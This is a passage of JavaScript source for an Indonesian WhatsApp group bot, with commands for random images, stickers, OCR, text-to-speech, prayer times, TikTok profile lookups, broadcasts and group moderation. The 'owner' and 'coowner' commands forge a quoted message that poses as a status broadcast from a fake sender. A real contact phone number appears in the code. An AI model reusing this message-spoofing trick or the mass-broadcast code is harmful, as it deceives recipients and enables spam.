					n = JSON.parse(JSON.stringify(data));
					nimek =  n[Math.floor(Math.random() * n.length)];
					pok = await getBuffer(nimek)
					Angga.sendMessage(from, pok, image, { quoted: mek })
					await limitAdd(sender)
					break
		case 'pemandangan':
					
                 if (!isRegistered) return reply( ind.noregis())
					if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
					Angga.updatePresence(from, Presence.composing) 
					data = await fetchJson(`https://api.fdci.se/rep.php?gambar=aesthetic%20pemandangan%20alam`, {method: 'get'})
					reply(ind.wait())
					n = JSON.parse(JSON.stringify(data));
					nimek =  n[Math.floor(Math.random() * n.length)];
					pok = await getBuffer(nimek)
					Angga.sendMessage(from, pok, image, { quoted: mek })
					await limitAdd(sender)
					break
		case 'osakana':
					
                 if (!isRegistered) return reply( ind.noregis())
					if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
					Angga.updatePresence(from, Presence.composing) 
					data = await fetchJson(`https://api.fdci.se/rep.php?gambar=osakana`, {method: 'get'})
					reply(ind.wait())
					n = JSON.parse(JSON.stringify(data));
					nimek =  n[Math.floor(Math.random() * n.length)];
					pok = await getBuffer(nimek)
					Angga.sendMessage(from, pok, image, { quoted: mek })
					await limitAdd(sender)
					break
		case 'menherachan':
					
                 if (!isRegistered) return reply( ind.noregis())
					if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
					Angga.updatePresence(from, Presence.composing) 
					data = await fetchJson(`https://api.fdci.se/rep.php?gambar=menhera-chan`, {method: 'get'})
					reply(ind.wait())
					n = JSON.parse(JSON.stringify(data));
					nimek =  n[Math.floor(Math.random() * n.length)];
					pok = await getBuffer(nimek)
					Angga.sendMessage(from, pok, image, { quoted: mek })
					await limitAdd(sender)
					break
		case 'naruto':
					
                 if (!isRegistered) return reply( ind.noregis())
					if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
					Angga.updatePresence(from, Presence.composing) 
					data = await fetchJson(`https://api.fdci.se/rep.php?gambar=naruto%20uzumaki%20wallpaper%20hd`, {method: 'get'})
					reply(ind.wait())
					n = JSON.parse(JSON.stringify(data));
					nimek =  n[Math.floor(Math.random() * n.length)];
					pok = await getBuffer(nimek)
					Angga.sendMessage(from, pok, image, { quoted: mek })
					await limitAdd(sender)
					break
		case 'animegirl':
					
                 if (!isRegistered) return reply( ind.noregis())
					if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
					Angga.updatePresence(from, Presence.composing) 
					data = await fetchJson(`https://api.fdci.se/rep.php?gambar=anime-girl`, {method: 'get'})
					reply(ind.wait())
					n = JSON.parse(JSON.stringify(data));
					nimek =  n[Math.floor(Math.random() * n.length)];
					pok = await getBuffer(nimek)
					Angga.sendMessage(from, pok, image, { quoted: mek })
					await limitAdd(sender)
					break
		case 'animeboy':
					
                 if (!isRegistered) return reply( ind.noregis())
					if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
					Angga.updatePresence(from, Presence.composing) 
					data = await fetchJson(`https://api.fdci.se/rep.php?gambar=anime-boy`, {method: 'get'})
					reply(ind.wait())
					n = JSON.parse(JSON.stringify(data));
					nimek =  n[Math.floor(Math.random() * n.length)];
					pok = await getBuffer(nimek)
					Angga.sendMessage(from, pok, image, { quoted: mek })
					await limitAdd(sender)
					break
		case 'quotesid':
					
                 if (!isRegistered) return reply( ind.noregis())
					if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
					Angga.updatePresence(from, Presence.composing) 
					data = await fetchJson(`https://api.fdci.se/rep.php?gambar=quotes%20indonesia`, {method: 'get'})
					reply(ind.wait())
					n = JSON.parse(JSON.stringify(data));
					nimek =  n[Math.floor(Math.random() * n.length)];
					pok = await getBuffer(nimek)
					Angga.sendMessage(from, pok, image, { quoted: mek })
					await limitAdd(sender)
					break
		case 'quotesen':
					
                 if (!isRegistered) return reply( ind.noregis())
					if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
					Angga.updatePresence(from, Presence.composing) 
					data = await fetchJson(`https://api.fdci.se/rep.php?gambar=quotes`, {method: 'get'})
					reply(ind.wait())
					n = JSON.parse(JSON.stringify(data));
					nimek =  n[Math.floor(Math.random() * n.length)];
					pok = await getBuffer(nimek)
					Angga.sendMessage(from, pok, image, { quoted: mek })
					await limitAdd(sender)
					break
		case 'katakata':
					
                 if (!isRegistered) return reply( ind.noregis())
					if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
					Angga.updatePresence(from, Presence.composing) 
					data = await fetchJson(`https://api.fdci.se/rep.php?gambar=katakata`, {method: 'get'})
					reply(ind.wait())
					n = JSON.parse(JSON.stringify(data));
					nimek =  n[Math.floor(Math.random() * n.length)];
					pok = await getBuffer(nimek)
					Angga.sendMessage(from, pok, image, { quoted: mek })
					await limitAdd(sender)
					break
		case 'katamotivasi':
					
                 if (!isRegistered) return reply( ind.noregis())
					if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
					Angga.updatePresence(from, Presence.composing) 
					data = await fetchJson(`https://api.fdci.se/rep.php?gambar=kata%20motivasi`, {method: 'get'})
					reply(ind.wait())
					n = JSON.parse(JSON.stringify(data));
					nimek =  n[Math.floor(Math.random() * n.length)];
					pok = await getBuffer(nimek)
					Angga.sendMessage(from, pok, image, { quoted: mek })
					await limitAdd(sender)
					break
		case 'kehidupan':
					
                 if (!isRegistered) return reply( ind.noregis())
					if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
					Angga.updatePresence(from, Presence.composing) 
					data = await fetchJson(`https://api.fdci.se/rep.php?gambar=kata%20kata%20bijak%20kehidupan`, {method: 'get'})
					reply(ind.wait())
					n = JSON.parse(JSON.stringify(data));
					nimek =  n[Math.floor(Math.random() * n.length)];
					pok = await getBuffer(nimek)
					Angga.sendMessage(from, pok, image, { quoted: mek })
					await limitAdd(sender)
					break
		case 'islami':
					
                 if (!isRegistered) return reply( ind.noregis())
					if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
					Angga.updatePresence(from, Presence.composing) 
					data = await fetchJson(`https://api.fdci.se/rep.php?gambar=quotes%20islami`, {method: 'get'})
					reply(ind.wait())
					n = JSON.parse(JSON.stringify(data));
					nimek =  n[Math.floor(Math.random() * n.length)];
					pok = await getBuffer(nimek)
					Angga.sendMessage(from, pok, image, { quoted: mek })
					await limitAdd(sender)
					break
		case 'fototiktok':
					
                 if (!isRegistered) return reply( ind.noregis())
					if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
					gatauda = body.slice(12)
					anu = await fetchJson(`https://docs-jojo.herokuapp.com/api/tiktokpp?user=${gatauda}` , {method: 'get'})
					buffer = await getBuffer(anu.result)
					reply(buffer)
					await limitAdd(sender)
					break
		case 'map':
					
                 if (!isRegistered) return reply( ind.noregis())
					if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
					anu = await fetchJson(`https://mnazria.herokuapp.com/api/maps?search=${body.slice(5)}`, {method: 'get'})
					buffer = await getBuffer(anu.gambar)
					Angga.sendMessage(from, buffer, image, {quoted: mek, caption: `${body.slice(5)}`})
					await limitAdd(sender)
					break
                case 'kbbi':
					
                 if (!isRegistered) return reply( ind.noregis())
					if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
					if (args.length < 1) return reply('Apa yang mau dicari kak?')
					anu = await fetchJson(`https://mnazria.herokuapp.com/api/kbbi?search=${body.slice(6)}`, {method: 'get'})
					reply('Menurut Kbbi:\n\n'+anu.result)
					await limitAdd(sender)
					break
                case 'artinama':
					
                 if (!isRegistered) return reply( ind.noregis())
					if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
					if (args.length < 1) return reply('Apa yang mau dicari kak?')
					anu = await fetchJson(`https://mnazria.herokuapp.com/api/arti?nama=${body.slice(10)}`, {method: 'get'})
					reply('Menurut nama:\n\n'+anu.result)
					await limitAdd(sender)
					break
		case 'quran':
					
                 if (!isRegistered) return reply( ind.noregis())
					if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
					anu = await fetchJson(`https://api.banghasan.com/quran/format/json/acak`, {method: 'get'})
					quran = `${anu.acak.ar.teks}\n\n${anu.acak.id.teks}\nQ.S ${anu.surat.nama} ayat ${anu.acak.id.ayat}`
					Angga.sendMessage(from, quran, text, {quoted: mek})
					await limitAdd(sender)
					break
		case 'quran':
					
                 if (!isRegistered) return reply( ind.noregis())
					if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
					anu = await fetchJson(`https://api.banghasan.com/quran/format/json/acak`, {method: 'get'})
					quran = `${anu.acak.ar.teks}\n\n${anu.acak.id.teks}\nQ.S ${anu.surat.nama} ayat ${anu.acak.id.ayat}`
					Angga.sendMessage(from, quran, text, {quoted: mek})
					await limitAdd(sender)
					break
		case 'jadwalsholat':
					
                 if (!isRegistered) return reply( ind.noregis())
					if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				if (args.length < 1) return reply('kota nya mana kak?')
					anu = await fetchJson(`https://tobz-api.herokuapp.com/api/jadwalshalat?q=${body.slice(14)}&apikey=${TobzKey}`, {method: 'get'})
					sholat = `Ashar : ${anu.result.ashar}\nDzuhur : ${anu.result.dzuhur}\nMagrib : ${anu.result.maghrib}\nIsha : ${anu.result.isha}\nSubuh : ${anu.result.subuh}`
					Angga.sendMessage(from, sholat, text, {quoted: mek})
					await limitAdd(sender)
					break
                case 'neonime':
				        
                 if (!isRegistered) return reply( ind.noregis())
				        if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
					Angga.updatePresence(from, Presence.composing) 
					data = await fetchJson(`https://docs-jojo.herokuapp.com/api/neonime_lastest`, {method: 'get'})
					teks = '################\n'
					for (let i of data.result) {
						teks += `*Title* : ${i.judul}\n*link* : ${i.link}\n*rilis* : ${i.rilis}\n###############\n`
					}
					reply(teks.trim())
					await limitAdd(sender)
					break
					case 'sticker': 
				if (!isRegistered) return reply(ind.noregis())
					if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
						const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
						const media = await Angga.downloadAndSaveMediaMessage(encmedia)
						ran = getRandom('.webp')
						await ffmpeg(`./${media}`)
							.input(media)
							.on('start', function (cmd) {
								console.log(`Started : ${cmd}`)
							})
							.on('error', function (err) {
								console.log(`Error : ${err}`)
								fs.unlinkSync(media)
								reply(ind.stikga)
							})
							.on('end', function () {
								console.log('Finish')
								exec(`webpmux -set exif ${addMetadata(namo, ator)} ${ran} -o ${ran}`, async (error) => {
									//if (error) {
											// reply(ind.stikga())
											// fs.unlinkSync(media)	
											// fs.unlinkSync(ran)
											// }
									Angga.sendMessage(from, fs.readFileSync(ran), sticker, {quoted: mek})
									fs.unlinkSync(media)	
									fs.unlinkSync(ran)	
								})
							})
							.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
							.toFormat('webp')
							.save(ran)
					} else if ((isMedia && mek.message.videoMessage.seconds < 11 || isQuotedVideo && mek.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.seconds < 11) && args.length == 0) {
						const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
						const media = await Angga.downloadAndSaveMediaMessage(encmedia)
						ran = getRandom('.webp')
						reply(ind.wait())
						await ffmpeg(`./${media}`)
							.inputFormat(media.split('.')[1])
							.on('start', function (cmd) {
								console.log(`Started : ${cmd}`)
							})
							.on('error', function (err) {
								console.log(`Error : ${err}`)
								fs.unlinkSync(media)
								tipe = media.endsWith('.mp4') ? 'video' : 'gif'
								reply(`âŒ Gagal, pada saat mengkonversi ${tipe} ke stiker`)
							})
							.on('end', function () {
								console.log('Finish')
								exec(`webpmux -set exif ${addMetadata(namo, ator)} ${ran} -o ${ran}`, async (error) => {
									//if (error) {
											// reply(ind.stikga())
											// fs.unlinkSync(media)	
											// fs.unlinkSync(ran)
											// }
									Angga.sendMessage(from, fs.readFileSync(ran), sticker, {quoted: mek})
									fs.unlinkSync(media)
									fs.unlinkSync(ran)
								})
							})
							.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
							.toFormat('webp')
							.save(ran)
					} else {
						reply(`Kirim gambar dengan caption ${prefix}sticker atau tag gambar yang sudah dikirim`)
					}
					break
		case 'ocr': 
					
                 if (!isRegistered) return reply( ind.noregis())
					if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
					if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
						const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
						const media = await Angga.downloadAndSaveMediaMessage(encmedia)
						reply(ind.wait())
						await recognize(media, {lang: 'eng+ind', oem: 1, psm: 3})
							.then(teks => {
								reply(teks.trim())
								fs.unlinkSync(media)
							})
							.catch(err => {
								reply(err.message)
								fs.unlinkSync(media)
							})
					} else {
						reply(`*Kirim foto dengan caption ${prefix}ocr*`)
					}
					await limitAdd(sender)
					break
		case 'gtts':
		case 'tts':
				
                 if (!isRegistered) return reply( ind.noregis())
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				if (args.length < 1) return Angga.sendMessage(from, 'Diperlukan kode bahasa kak!!', text, {quoted: mek})
					const gtts = require('./lib/gtts')(args[0])
					if (args.length < 2) return Angga.sendMessage(from, 'Mana teks yang mau di jadiin suara? suara setan kah?', text, {quoted: mek})
					dtt = body.slice(8)
					ranm = getRandom('.mp3')
					rano = getRandom('.ogg')
					dtt.length > 500
					? reply('Textnya kebanyakan setan!! 😤')
					: gtts.save(ranm, dtt, function() {
						exec(`ffmpeg -i ${ranm} -ar 48000 -vn -c:a libopus ${rano}`, (err) => {
							fs.unlinkSync(ranm)
							buffer = fs.readFileSync(rano)
							if (err) return reply(ind.stikga())
							Angga.sendMessage(from, buffer, audio, {quoted: mek, ptt:true})
							fs.unlinkSync(rano)
						})
					})
					await limitAdd(sender)
					break
		case 'setprefix':
					if (args.length < 1) return
					if (!isOwner) return reply(ind.ownerb())
					prefix = args[0]
					reply(`*Prefix berhasil di ubah menjadi* : ${prefix}`)
					break 
		case 'setlimit':
		case 'addlimit':
					if (args.length < 1) return
					if (!isOwner) return reply(ind.ownerb())
					limitawal = args[0]
					reply(`*Limit berhasil di ubah menjadi* : ${limitawal}`)
					break 
		case 'setlimitt':
		case 'addlimitt':
					if (args.length < 1) return
				if (!isAdmin) return reply('*Only Admin bot*')
					limitawal = args[0]
					reply(`*Limit berhasil di ubah menjadi* : ${limitawal}`)
					break 
		case 'setmemlimit':
					if (args.length < 1) return
					if (!isOwner) return reply(ind.ownerb())
					if (isNaN(args[0])) return reply('Limit harus angka')
					memberlimit = args[0]
					reply(`Change Member limit To ${memberlimit} SUCCESS!`)
					break 
		case 'setmemlimitt':
					if (args.length < 1) return
				if (!isAdmin) return reply('*Only Admin bot*')
					if (isNaN(args[0])) return reply('Limit harus angka')
					memberlimit = args[0]
					reply(`Change Member limit To ${memberlimit} SUCCESS!`)
					break 
		case 'tiktokstalk':
				
                 if (!isRegistered) return reply( ind.noregis())
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				try {
						if (args.length < 1) return Angga.sendMessage(from, '*Username mana kak?', text, {quoted: mek})
						let { user, stats } = await tiktod.getUserProfileInfo(args[0])
						reply(ind.wait())
						teks = `*ID* : ${user.id}\n*Username* : ${user.uniqueId}\n*Nickname* : ${user.nickname}\n*Followers* : ${stats.followerCount}\n*Followings* : ${stats.followingCount}\n*Posts* : ${stats.videoCount}\n*Luv* : ${stats.heart}\n`
						buffer = await getBuffer(user.avatarLarger)
						Angga.sendMessage(from, buffer, image, {quoted: mek, caption: teks})
					} catch (e) {
						console.log(`Error :`, color(e,'red'))
						reply('*(ERROR)* *Kemungkinan username tidak valid*')
					}
					await limitAdd(sender)
					break
                 case 'linkgc':
				if (!isGroup) return reply(ind.groupo())
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (!isBotGroupAdmins) return reply(ind.badmin())
				linkgc = await Angga.groupInviteCode (from)
				yeh = `https://chat.whatsapp.com/${linkgc}\n\nlink Group *${groupName}*`
				Angga.sendMessage(from, yeh, text, {quoted: mek})
				await limitAdd(sender)
				break
		case 'sayang':
					Angga.sendMessage(from, 'Apa sayangku? 🥰',MessageType.text, { quoted: mek} )
					break
		case 'gelud':
					Angga.sendMessage(from, 'Kuylah, dapat duit aku..',MessageType.text, { quoted: mek} )
					break
		case 'bot':
					Angga.sendMessage(from, 'Iya kak? \nJangan lupa daftar ya kak ^_^"\nJika sudah silahkan berarti sudah terdaftar kak ^_^"',MessageType.text, { quoted: mek} )
					break
		case 'hargaprem':
		case 'hargapremium':
					Angga.sendMessage(from, 'Level 100 = Free 3 day (premium)\n10k = 30day (premium)',MessageType.text, { quoted: mek} )
					break
		case 'buypremium':
					Angga.sendMessage(from, 'Ingin membeli premium?\nHarap hubungi kami : wa.me/6285283427860',MessageType.text, { quoted: mek} )
					break
		case 'buypremunlimited':
					
					Angga.sendMessage(from, 'Selamat kamu sudah berlangganan selamanya 🎉',MessageType.text, { quoted: mek} )
					break
		case 'buyprem30day':
					
					Angga.sendMessage(from, 'Selamat kamu sudah berlangganan 30 hari',MessageType.text, { quoted: mek} )
					break
		case 'buyprem7day':
					
					Angga.sendMessage(from, 'Selamat kamu sudah berlangganan 7 hari',MessageType.text, { quoted: mek} )
					break
		case 'test':
					Angga.sendMessage(from, 'Active',MessageType.text, { quoted: mek} )
					break
		case 'ping':
					Angga.sendMessage(from, 'Active',MessageType.text, { quoted: mek} )
					break
		case 'assalamualaikum':
					Angga.sendMessage(from, 'Waalaikumusalam',MessageType.text, { quoted: mek} )
					break
		case 'kontol':
					Angga.sendMessage(from, 'Gunakan bahasa yang benar\nAnda akan kami banned!\nHubungi kami : wa.me/6285283427860',MessageType.text, { quoted: mek} )
					break

		case 'jembut':
					Angga.sendMessage(from, 'Gunakan bahasa yang benar\nAnda akan kami banned!\nHubungi kami : wa.me/6285283427860',MessageType.text, { quoted: mek} )
					break
		case 'ngentod':
					Angga.sendMessage(from, 'Gunakan bahasa yang benar\nAnda akan kami banned!\nHubungi kami : wa.me/6285283427860',MessageType.text, { quoted: mek} )
					break
		case 'kntl':
					Angga.sendMessage(from, 'Gunakan bahasa yang benar\nAnda akan kami banned!\nHubungi kami : wa.me/6285283427860',MessageType.text, { quoted: mek} )
					break

		case 'wa.me':
		case 'wame':
  					
                 if (!isRegistered) return reply( ind.noregis())
  					if (isLimit(sender)) return reply(ind.limitend(pusname))
  					Angga.updatePresence(from, Presence.composing) 
  					options = {
  					text: `「 *SELF WHATSAPP* 」\n\n_Request by_ : *@${sender.split("@s.whatsapp.net")[0]}\n\nYour link WhatsApp : *https://wa.me/${sender.split("@s.whatsapp.net")[0]}*\n*Or ( / )*\n*https://api.whatsapp.com/send?phone=${sender.split("@")[0]}*`,
  					contextInfo: { mentionedJid: [sender] }
  					}
  					Angga.sendMessage(from, options, text, { quoted: mek } )
  					break
  					if (data.error) return reply(data.error)
  					reply(data.result)
					await limitAdd(sender)
  					break
		case 'tagall2':
					if (!isGroup) return reply(ind.groupo())
					if (!isGroupAdmins) return reply(ind.admin())
					query = args.join(" ")
					members_id = []
					teks = (args.length > 1) ? body.slice(8).trim() : ''
					teks += '\n'
					for (let mem of groupMembers) {
						teks += `├ ❏ *@${mem.jid.split('@')[0]}*\n`
						members_id.push(mem.jid)
					}
					mentions(`┌───「 ANGGA TAG」───\n│•Dari: ${pushname}\n│•Pesan: *${query}*\n├──────────────`+ teks +'└───「 *_AnggaGanz_* 」────', members_id, true)
					break
					case 'tagall':
					if (!isGroup) return reply(ind.groupo())
					if (!isGroupAdmins) return reply(ind.admin())
					query = args.join(" ")
					members_id = []
					teks = (args.length > 1) ? body.slice(8).trim() : ''
					teks += '\n'
					for (let mem of groupMembers) {
						teks += `├ ❏ *@${mem.jid.split('@')[0]}*\n`
						members_id.push(mem.jid)
					}
					mentions(`┌───「AnggaGanzz TAG」───`+ teks +'└───「 *_Pxc7_* 」────', members_id, true)
					break
		case 'clearall':
					if (!isOwner) return reply(ind.ownerb())
					anu = await Angga.chats.all()
					Angga.setMaxListeners(25)
					for (let _ of anu) {
						Angga.deleteChat(_.jid)
					}
					reply(ind.clears())
					break
					case 'addpremium':
					if (!isOwner) return reply(ind.ownerb())
					adpr = body.slice(10)
					prem.push(`${adpr}@s.whatsapp.net`)
					fs.writeFileSync('./database/pengguna/premium.json', JSON.stringify(premium))
					manuk = `Berhasil Menambahkan @${adpr.split("@")[0]} Ke Daftar Premium`
					Angga.sendMessage(from, manuk, text, { quoted: ftoko, contextInfo: {"mentionedJid": [adpr], forwardingScore: 1000, isForwarded: true }})
					break
		case 'blockk':
				 Angga.updatePresence(from, Presence.composing) 
				 Angga.chatRead (from)
					if (!isGroup) return reply(ind.groupo())
				if (!isAdmin) return reply('*Only Admin bot*')
					Angga.blockUser (`${body.slice(8)}@c.us`, "add")
					Angga.sendMessage(from, `*Perintah Diterima, Memblokir* ${body.slice(7)}@c.us`, text)
					break
		case 'unblockk':
					if (!isGroup) return reply(ind.groupo())
				if (!isAdmin) return reply('*Only Admin bot*')
				    Angga.blockUser (`${body.slice(10)}@c.us`, "remove")
					Angga.sendMessage(from, `*Perintah Diterima, Membuka Blockir* ${body.slice(9)}@c.us`, text)
					break
					
		case 'block':
				 Angga.updatePresence(from, Presence.composing) 
				 Angga.chatRead (from)
					if (!isGroup) return reply(ind.groupo())
					if (!isOwner) return reply(ind.ownerb())
					Angga.blockUser (`${body.slice(7)}@c.us`, "add")
					Angga.sendMessage(from, `*Perintah Diterima, Memblokir* ${body.slice(7)}@c.us`, text)
					break
		case 'unblock':
					if (!isGroup) return reply(ind.groupo())
					if (!isOwner) return reply(ind.ownerb())
				    Angga.blockUser (`${body.slice(9)}@c.us`, "remove")
					Angga.sendMessage(from, `*Perintah Diterima, Membuka Blockir* ${body.slice(9)}@c.us`, text)
					break
		case 'leave':
			if (!isOwner) return reply(ind.ownerb()) 
                      setTimeout( () => {
                      Angga.groupLeave (from) 
                      }, 2000)
                      setTimeout( () => {
                      Angga.updatePresence(from, Presence.composing) 
                      reply('oke desu')
                      }, 0)
                      break			
		case 'bc': 
					if (!isOwner) return reply(ind.ownerb()) 
					if (args.length < 1) return reply('.......')
					anu = await Angga.chats.all()
					if (isMedia && !mek.message.videoMessage || isQuotedImage) {
						const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
						buff = await Angga.downloadMediaMessage(encmedia)
						for (let _ of anu) {
							Angga.sendMessage(_.jid, buff, image, {caption: `*「 PESAN BROADCAST 」*\n\n${body.slice(4)}`})
						}
						reply('*Suksess broadcast* ')
					} else {
						for (let _ of anu) {
							sendMess(_.jid, `*「 BC BY OWNER 」*\n\n${body.slice(4)}`)
						}
						reply('*Suksess broadcast* ')
					}
					break
		case 'bcc': 
				if (!isAdmin) return reply('*Only Admin bot*')
					if (args.length < 1) return reply('.......')
					anu = await Angga.chats.all()
					if (isMedia && !mek.message.videoMessage || isQuotedImage) {
						const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
						buff = await Angga.downloadMediaMessage(encmedia)
						for (let _ of anu) {
							Angga.sendMessage(_.jid, buff, image, {caption: `*「 PESAN BROADCAST 」*\n\n${body.slice(4)}`})
						}
						reply('*Suksess broadcast* ')
					} else {
						for (let _ of anu) {
							sendMess(_.jid, `*「 ALL BROADCAST 」*\n\n${body.slice(4)}`)
						}
						reply('*Suksess broadcast* ')
					}
					break
		case 'setpp': 
					if (!isGroup) return reply(ind.groupo())
					if (!isGroupAdmins) return reply(ind.admin())
                   			if (!isBotGroupAdmins) return reply(ind.badmin())
					media = await Angga.downloadAndSaveMediaMessage(mek)
					await Angga.updateProfilePicture (from, media)
					reply('*Sukses mengganti icon group*')
					break				
		case 'add':
					if (!isGroup) return reply(ind.groupo())
					if (!isGroupAdmins) return reply(ind.admin())
					if (!isBotGroupAdmins) return reply(ind.badmin())
					if (args.length < 1) return reply('Yang mau di add jin ya?')
					if (args[0].startsWith('08')) return reply('Gunakan kode negara kak')
					try {
						num = `${args[0].replace(/ /g, '')}@s.whatsapp.net`
						Angga.groupAdd(from, [num])
					} catch (e) {
						console.log('Error :', e)
						reply('Gagal menambahkan target, mungkin karena di private')
					}
					break
		case 'grup':
		case 'group':
					if (!isGroup) return reply(ind.groupo())
					if (!isGroupAdmins) return reply(ind.admin())
					if (!isBotGroupAdmins) return reply(ind.badmin())
					if (args[0] === 'buka') {
					    reply(`*BERHASIL MEMBUKA GROUP*`)
						Angga.groupSettingChange(from, GroupSettingChange.messageSend, false)
					} else if (args[0] === 'tutup') {
						reply(`*BERHASIL MENUTUP GROUP*`)
						Angga.groupSettingChange(from, GroupSettingChange.messageSend, true)
					}
					break      
            case 'admin':
            case 'owner':
            case 'creator':
            case 'developer':
                  Angga.sendMessage(from, {displayname: "Jeff", vcard: vcard}, MessageType.contact, { quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: {"contactMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg", "title": fakereply, "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=", "fileLength": "28777", "height": 1080, "width": 1079, "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=", "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=", "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69", "mediaKeyTimestamp": "1610993486", "jpegThumbnail": fs.readFileSync('./me.jpg')}}}, contextInfo: { forwardingScore: 508, isForwarded: true}})
                  Angga.sendMessage(from, 'Tinggalkan Pesan Kepada Owner Kami!',MessageType.text, { quoted: mek, contextInfo: { forwardingScore: 508, isForwarded: true}} )
					break
					case 'coowner':
                 Angga.sendMessage(from, {displayname: "Jeff", vcard: vcard1}, MessageType.contact, { quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: {"contactMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg", "title": fakereply, "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=", "fileLength": "28777", "height": 1080, "width": 1079, "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=", "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=", "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69", "mediaKeyTimestamp": "1610993486", "jpegThumbnail": fs.readFileSync('./me.jpg')}}}, contextInfo: { forwardingScore: 508, isForwarded: true}})
                  Angga.sendMessage(from, 'Tinggalkan Pesan Kepada Owner Kami!',MessageType.text, { quoted: mek, contextInfo: { forwardingScore: 508, isForwarded: true}} )
                 break
           case 'kick':
					if (!isGroup) return reply(ind.groupo())
					if (!isGroupAdmins) return reply(ind.admin())
					if (!isBotGroupAdmins) return reply('BOT JADIIN ADMIN DULU')
					if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('𝗧𝗮𝗴 𝘁𝗮𝗿𝗴𝗲𝘁 Y𝗮𝗻𝗴 𝗶𝗻𝗴𝗶𝗻 𝗱𝗶 𝘁𝗲𝗻𝗱𝗮𝗻𝗴!')
					mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
					if (mentioned.length > 1) {
						Angga.groupRemove(from, mentioned)
						}
					break
		case 'demote':
					if (!isGroup) return reply(ind.groupo())
					if (!isGroupAdmins) return reply(ind.admin())
